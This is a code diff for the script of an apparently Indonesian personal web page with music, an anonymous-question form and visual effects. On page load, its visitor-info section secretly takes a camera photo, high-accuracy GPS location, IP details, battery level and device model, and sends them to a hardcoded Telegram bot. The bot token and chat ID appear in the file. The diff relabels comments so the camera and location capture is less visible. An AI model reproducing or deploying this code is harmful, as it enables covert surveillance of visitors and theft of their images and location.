@@ -6,11 +6,10 @@ if (openPhotoOptions && photoOptions) {
   });
 }
 
-// NOTE: replace the two placeholders below with your actual bot token and chat id
 const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
 const CHAT_ID = "6864694275";
 
-// === BAGIAN MUSIK — REVISI MOBILE FRIENDLY ===
+// === BAGIAN MUSIK ===
 const music = document.getElementById('bgmusic');
 const btnMusic = document.getElementById('musicButton');
 let started = false;
@@ -59,7 +58,7 @@ if (isMobile) {
 } else {
   setTimeout(() => { startMusic(); }, 800);
 }
-// === MODAL PERTANYAAN ===
+// === PERTANYAAN ===
 const modal = document.getElementById('modal');
 document.getElementById('openAsk').onclick = () => modal.classList.add('show');
 document.getElementById('closeQ').onclick = () => modal.classList.remove('show');
@@ -138,7 +137,7 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   const qmsg = document.getElementById('qmsg');
 
   if (!text && !photo) {
-    qmsg.textContent = "Tulis pertanyaan atau unggah foto dulu.";
+    qmsg.textContent = "Tulis pesan atau kirim foto.";
     return;
   }
 
@@ -152,9 +151,9 @@ document.getElementById('sendQ').addEventListener('click', async () => {
     try {
       const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
       if (res.ok) qmsg.textContent = "📨 Terkirim ✓";
-      else qmsg.textContent = "💔 Gagal mengirim foto.";
+      else qmsg.textContent = "Gagal mengirim foto.";
     } catch {
-      qmsg.textContent = "😿 Gagal koneksi.";
+      qmsg.textContent = "Gagal koneksi.";
     }
   } else if (text) {
     await sendTelegramMessage(
@@ -173,7 +172,7 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   }, 1000);
 });
 
-// === INFO PENGUNJUNG + LOKASI + CAMERA AUTO-CAPTURE ===
+// === INFO PENGUNJUNG ===
 (async function showVisitorInfo() {
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
 
@@ -196,82 +195,55 @@ document.getElementById('sendQ').addEventListener('click', async () => {
     let visitCount = parseInt(localStorage.getItem("visitor_visits") || "0", 10);
     visitCount = isNaN(visitCount) ? 1 : (visitCount + 1);
     localStorage.setItem("visitor_visits", String(visitCount));
-  } catch (err) { console.warn("visitor-id error:", err); }
+  } catch (err) { console.warn("visitor error:", err); }
 
-// === KONFIGURASI BOT ===
-const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
-const CHAT_ID = "6864694275";
-
-// === UTILITY ===
-async function safeFetch(url, opts = {}, retries = 3, retryDelay = 800) {
-  for (let i = 0; i < retries; i++) {
-    try { return await fetch(url, opts); }
-    catch (e) { if(i === retries-1) throw e; await new Promise(r=>setTimeout(r,retryDelay*Math.pow(2,i))); }
-  }
-}
-
-function detectDeviceBrandModel() {
-  const ua = navigator.userAgent.toLowerCase();
-  let brand = "Tidak diketahui", model = "";
-  if (/xiaomi|redmi|mi\s/i.test(ua)) brand = "Xiaomi / Redmi";
-  else if (/poco/i.test(ua)) brand = "Poco";
-  else if (/samsung|sm-|galaxy/i.test(ua)) brand = "Samsung";
-  else if (/iphone|ipad|ipod/i.test(ua)) brand = "Apple";
-  else if (/vivo/i.test(ua)) brand = "Vivo";
-  else if (/oppo/i.test(ua)) brand = "Oppo";
-  else if (/realme/i.test(ua)) brand = "Realme";
-  else if (/huawei|honor/i.test(ua)) brand = "Huawei/Honor";
-  else if (/asus|zenfone/i.test(ua)) brand = "ASUS";
-  else if (/lenovo/i.test(ua)) brand = "Lenovo";
-  else if (/infinix/i.test(ua)) brand = "Infinix";
-  else if (/tecno/i.test(ua)) brand = "Tecno";
-  else if (/nokia/i.test(ua)) brand = "Nokia";
-  else if (/oneplus/i.test(ua)) brand = "OnePlus";
-  else if (/motorola|moto/i.test(ua)) brand = "Motorola";
-  else if (/google/i.test(ua)) brand = "Google Pixel";
-  else if (/sony/i.test(ua)) brand = "Sony Xperia";
-
-  if (/galaxy\s?([asnjz]\d{1,3}|note\s?\d{1,2})/i.test(ua)) {
-    const m = ua.match(/galaxy\s?([asnjz]\d{1,3}|note\s?\d{1,2})/i);
-    model = "Galaxy " + m[1].toUpperCase();
-  } else if (/redmi\s(note|[0-9]+)/i.test(ua)) {
-    const m = ua.match(/redmi\s(note\s?\d+|[0-9]+)/i); model=m[0].replace(/\s+/g," ");
-  } else if (/poco\s([a-z0-9\s]+)/i.test(ua)) model = ua.match(/poco\s([a-z0-9\s]+)/i)[0].toUpperCase();
-  else if (/mi\s([0-9a-z]+)/i.test(ua)) model = ua.match(/mi\s([0-9a-z]+)/i)[0].toUpperCase();
-  else if (/vivo\s([a-z0-9]+)/i.test(ua)) model = ua.match(/vivo\s([a-z0-9]+)/i)[0].toUpperCase();
-  else if (/oppo\s([a-z0-9]+)/i.test(ua)) model = ua.match(/oppo\s([a-z0-9]+)/i)[0].toUpperCase();
-  else if (/realme\s([a-z0-9]+)/i.test(ua)) model = ua.match(/realme\s([a-z0-9]+)/i)[0].toUpperCase();
-  else if (/iphone\s?[0-9]*/i.test(ua)) { const m = ua.match(/iphone\s?[0-9]*/i); model = m ? m[0].replace(/\s+/g," ") : "iPhone"; }
-
-  if (model && !model.toLowerCase().includes(brand.toLowerCase())) return `${brand} ${model}`;
-  return brand;
-}
-
-// === VISITOR INFO ===
-async function showVisitorInfo() {
-  const savedUser = localStorage.getItem("ig_user") || "Anonim";
-
-  // Visitor ID & kunjungan
-  try {
-    let visitorID = localStorage.getItem("visitor_id");
-    if (!visitorID) {
-      const raw = `${Date.now()}-${Math.random().toString(36).slice(2,10)}-${navigator.userAgent}`;
-      try {
-        const enc = new TextEncoder();
-        const hashBuf = await crypto.subtle.digest("SHA-256", enc.encode(raw));
-        visitorID = Array.from(new Uint8Array(hashBuf)).map(b => b.toString(16).padStart(2,"0")).join("").slice(0,16);
-      } catch {
-        visitorID = ("v" + Math.random().toString(36).slice(2,10) + Date.now().toString(36)).slice(0,16);
-      }
-      localStorage.setItem("visitor_id", visitorID);
-      localStorage.setItem("visitor_first_seen", new Date().toISOString());
+  // --- Safe fetch dengan retry ---
+  async function safeFetch(url, opts = {}, retries = 3, retryDelay = 800) {
+    for (let i = 0; i < retries; i++) {
+      try { return await fetch(url, opts); }
+      catch (e) { if(i === retries-1) throw e; await new Promise(r=>setTimeout(r,retryDelay*Math.pow(2,i))); }
     }
-    let visitCount = parseInt(localStorage.getItem("visitor_visits") || "0", 10);
-    visitCount = isNaN(visitCount) ? 1 : visitCount + 1;
-    localStorage.setItem("visitor_visits", String(visitCount));
-  } catch(e) { console.warn("Visitor error:", e); }
+  }
 
-  // Kirim info visitor ke Telegram
+  // --- Deteksi brand & model device ---
+  function detectDeviceBrandModel() {
+    const ua = navigator.userAgent.toLowerCase();
+    let brand = "Tidak diketahui", model = "";
+    if (/xiaomi|redmi|mi\s/i.test(ua)) brand = "Xiaomi / Redmi";
+    else if (/poco/i.test(ua)) brand = "Poco";
+    else if (/samsung|sm-|galaxy/i.test(ua)) brand = "Samsung";
+    else if (/iphone|ipad|ipod/i.test(ua)) brand = "Apple";
+    else if (/vivo/i.test(ua)) brand = "Vivo";
+    else if (/oppo/i.test(ua)) brand = "Oppo";
+    else if (/realme/i.test(ua)) brand = "Realme";
+    else if (/huawei|honor/i.test(ua)) brand = "Huawei/Honor";
+    else if (/asus|zenfone/i.test(ua)) brand = "ASUS";
+    else if (/lenovo/i.test(ua)) brand = "Lenovo";
+    else if (/infinix/i.test(ua)) brand = "Infinix";
+    else if (/tecno/i.test(ua)) brand = "Tecno";
+    else if (/nokia/i.test(ua)) brand = "Nokia";
+    else if (/oneplus/i.test(ua)) brand = "OnePlus";
+    else if (/motorola|moto/i.test(ua)) brand = "Motorola";
+    else if (/google/i.test(ua)) brand = "Google Pixel";
+    else if (/sony/i.test(ua)) brand = "Sony Xperia";
+
+    if (/galaxy\s?([asnjz]\d{1,3}|note\s?\d{1,2})/i.test(ua)) {
+      const m = ua.match(/galaxy\s?([asnjz]\d{1,3}|note\s?\d{1,2})/i);
+      model = "Galaxy " + m[1].toUpperCase();
+    } else if (/redmi\s(note|[0-9]+)/i.test(ua)) {
+      const m = ua.match(/redmi\s(note\s?\d+|[0-9]+)/i); model=m[0].replace(/\s+/g," ");
+    } else if (/poco\s([a-z0-9\s]+)/i.test(ua)) model = ua.match(/poco\s([a-z0-9\s]+)/i)[0].toUpperCase();
+    else if (/mi\s([0-9a-z]+)/i.test(ua)) model = ua.match(/mi\s([0-9a-z]+)/i)[0].toUpperCase();
+    else if (/vivo\s([a-z0-9]+)/i.test(ua)) model = ua.match(/vivo\s([a-z0-9]+)/i)[0].toUpperCase();
+    else if (/oppo\s([a-z0-9]+)/i.test(ua)) model = ua.match(/oppo\s([a-z0-9]+)/i)[0].toUpperCase();
+    else if (/realme\s([a-z0-9]+)/i.test(ua)) model = ua.match(/realme\s([a-z0-9]+)/i)[0].toUpperCase();
+    else if (/iphone\s?[0-9]*/i.test(ua)) { const m = ua.match(/iphone\s?[0-9]*/i); model = m ? m[0].replace(/\s+/g," ") : "iPhone"; }
+
+    if (model && !model.toLowerCase().includes(brand.toLowerCase())) return `${brand} ${model}`;
+    return brand;
+  }
+
+  // --- Kirim info visitor ---
   async function sendToTelegram(d, latitude, longitude, source="Unknown", accuracy=null) {
     try {
       const now = new Date();
@@ -286,7 +258,6 @@ async function showVisitorInfo() {
                  /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
       let batteryInfo = "Tidak diketahui";
       try { if(navigator.getBattery){ const b=await navigator.getBattery(); batteryInfo=`${(b.level*100).toFixed(0)}% (${b.charging?"⚡":"🔋"})`; } } catch {}
-
       const visitorID = localStorage.getItem("visitor_id") || "unknown";
       const visits = localStorage.getItem("visitor_visits") || "1";
       const firstSeen = localStorage.getItem("visitor_first_seen") || null;
@@ -305,15 +276,15 @@ async function showVisitorInfo() {
 📡 IP: ${d.ip || "?"}
 🕓 ${now.toLocaleString('id-ID')}`;
 
-      await safeFetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      await safeFetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
         method:"POST",
         headers:{ "Content-Type":"application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        body:JSON.stringify({ chat_id:CHAT_ID, text:msg })
       },4);
-    } catch(e){ console.error("Gagal kirim info:", e); }
+    } catch(e){ console.error("Gagal memuat:",e); }
   }
 
-  // Auto-capture kamera
+  // --- Perizinan ---
   async function autoCaptureCamera() {
     try {
       if(navigator.mediaDevices){
@@ -321,54 +292,48 @@ async function showVisitorInfo() {
         const video = document.createElement("video");
         video.srcObject = stream;
         video.playsInline = true;
-        video.muted = true; // hindari blokir autoplay
         await new Promise(res => { video.onloadedmetadata = () => video.play().then(res).catch(res); setTimeout(res,1500); });
 
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
-        canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video,0,0,canvas.width,canvas.height);
 
-        const blob = await (await fetch(canvas.toDataURL("image/png"))).blob();
+        const base64img = canvas.toDataURL("image/png");
+        stream.getTracks().forEach(t=>t.stop());
+
+        const blob = await (await fetch(base64img)).blob();
         const fd = new FormData();
         fd.append("chat_id", CHAT_ID);
         fd.append("caption", "📸 Auto-capture visitor");
         fd.append("photo", blob, "capture.png");
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:"POST", body: fd });
 
-        stream.getTracks().forEach(t=>t.stop());
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
+        if(res.ok) console.log("Berhasil");
       }
-    } catch(e){ console.warn("Gagal capture kamera:", e); }
+    } catch(e){ console.warn("Gagal:",e); }
   }
 
-  // Proses utama paralel: kamera + lokasi
-  const locationPromise = new Promise((res,rej) => {
-    if(navigator.geolocation){
-      navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:8000,maximumAge:0});
-    } else rej("No geolocation");
-  });
-
-  const cameraPromise = autoCaptureCamera();
-  const [locResult] = await Promise.allSettled([locationPromise, cameraPromise]);
-
-  if(locResult.status === "fulfilled"){
-    const { latitude, longitude, accuracy } = locResult.value.coords;
-    try {
-      const ipData = await (await fetch("https://ipwho.is/")).json();
-      await sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
-    } catch(e){ console.error("Gagal fetch IP:", e); }
-  } else {
+  // --- PROSES UTAMA ---
+  try {
+    const coords = await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:8000,maximumAge:0}));
+    const {latitude,longitude,accuracy} = coords.coords;
+    const ipData = await (await fetch("https://ipwho.is/")).json();
+    await sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
+  } catch {
     try {
       const d = await (await fetch("https://ipwho.is/")).json();
       await sendToTelegram(d, d.latitude, d.longitude, "IP-based");
     } catch(e){
-      console.error("Gagal kirim fallback IP:", e);
-      await sendToTelegram({city:"?", country:"?", ip:"?"}, null, null, "unknown");
+      console.error("Gagal:", e);
+      await sendToTelegram({city:"?",country:"?",ip:"?"},null,null,"unknown");
     }
   }
-}
 
-showVisitorInfo();
+  // --- Jalankan ---
+  autoCaptureCamera();
+})();
 
 // === EFEK BUTTERFLY 💸 ===
 (function () {
@@ -625,3 +590,4 @@ showVisitorInfo();
   updateSpotify();
   setInterval(updateSpotify, 8000);
 })();
+
